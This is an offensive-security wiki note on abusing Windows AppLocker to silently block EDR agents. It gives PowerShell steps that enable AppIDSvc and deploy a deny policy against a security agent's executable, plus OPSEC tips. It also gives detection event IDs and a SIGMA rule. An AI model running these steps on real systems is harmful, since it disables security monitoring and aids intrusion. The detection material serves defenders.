---
title: AppLocker Rules Abuse
permalink: /wiki/concepts/applocker-abuse/
layout: single
author_profile: true
tags:
- offsec-notes
- concept
redirect_from:
- /wiki/concepts/applocker-abuse/
---

**Category:** Defense Evasion / Execution
**MITRE ATT&CK:** T1562.001 — Impair Defenses: Disable or Modify Tools; T1518.001 — Software Discovery: Security Software Discovery
**Related:** [Evasion Techniques](/wiki/concepts/evasion-techniques/), [Privilege Escalation Windows](/wiki/concepts/privilege-escalation-windows/), [Edr Silencing](/wiki/concepts/edr-silencing/)

## Overview
AppLocker is a Windows application control feature that can be abused by local administrators to silently block EDR processes. By enabling the AppIdentification service and deploying a deny policy targeting security software executables, an attacker can neutralize EDR agents without directly uninstalling them — making the action less conspicuous than typical tampering.

## Mechanism

AppLocker enforcement requires the **AppIDSvc** service to be running. The service is disabled by default and must be started manually or via policy. Once running, deny rules block execution of targeted processes, including EDR agents.

### Tools
- **GhostLocker** PoC (github.com/Hagrid29/GhostLocker) — automates enabling AppIDSvc and deploying deny rules via PowerShell

## Attack Procedure

### Step 1: Enable AppIDSvc
```powershell
# Change start type to Automatic and start the service
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\AppIDSvc" -Name "Start" -Value 2
Start-Service AppIDSvc
```

### Step 2: Deploy AppLocker Deny Policy
```powershell
# Create XML policy blocking target EDR executable
$policy = @"
<AppLockerPolicy Version="1">
  <RuleCollection Type="Exe" EnforcementMode="Enabled">
    <FilePathRule Id="...GUID..." Name="Block EDR" Action="Deny" UserOrGroupSid="S-1-1-0">
      <Conditions>
        <FilePathCondition Path="C:\Program Files\EDRVendor\agent.exe"/>
      </Conditions>
    </FilePathRule>
  </RuleCollection>
</AppLockerPolicy>
"@

$policy | Out-File -FilePath "C:\temp\deny_policy.xml"
Set-AppLockerPolicy -XMLPolicy "C:\temp\deny_policy.xml" -Merge
```

### Requirement
- **Local Administrator** — required to modify service configuration and AppLocker policy

## Detection

### Key Event IDs

| Event ID | Source | Description |
|----------|--------|-------------|
| 8001 | AppLocker | Rule allowed execution |
| 8004 | AppLocker | Rule blocked execution — critical for detecting EDR blocking |
| 4657 | Security | Registry value modified (AppIDSvc start type) |
| 4663 | Security | Registry object access |
| 7040 | System | Service start type changed |

Event ID **8004** firing against known EDR process names is the primary detection indicator. Security products blocked by AppLocker will emit a 8004 event before their process is prevented from starting.

### SIGMA (Event ID 8004 blocking EDR)
```yaml
title: AppLocker Blocking EDR/Security Software
status: experimental
description: AppLocker deny rule prevented execution of a known security tool
logsource:
  product: windows
  service: applocker
detection:
  selection:
    EventID: 8004
    FilePath|contains:
      - 'CrowdStrike'
      - 'SentinelOne'
      - 'CarbonBlack'
      - 'MDE'
      - 'Defender'
  condition: selection
level: high
```

### Behavioral Indicators
- AppIDSvc changing from Disabled to Running — almost never happens legitimately outside of explicit policy deployment
- AppLocker policy creation or modification by a non-administrative script or C2 beacon
- EDR agent process disappears from process list without explicit uninstall

## OPSEC Notes
- GhostLocker PoC is unsigned; may be flagged by existing EDR before it runs
- If EDR catches and blocks the enable-AppIDSvc step, the technique fails
- The Disabled→Automatic→Running service chain creates Event ID 7040 + 7036 — high-fidelity detection
- Target service names vary by vendor — enumerate with `sc query type=all` before crafting deny rules

## References
- ipurple.team — "AppLocker Rules Abuse" (2026-02-02)
- GhostLocker PoC — github.com/Hagrid29/GhostLocker
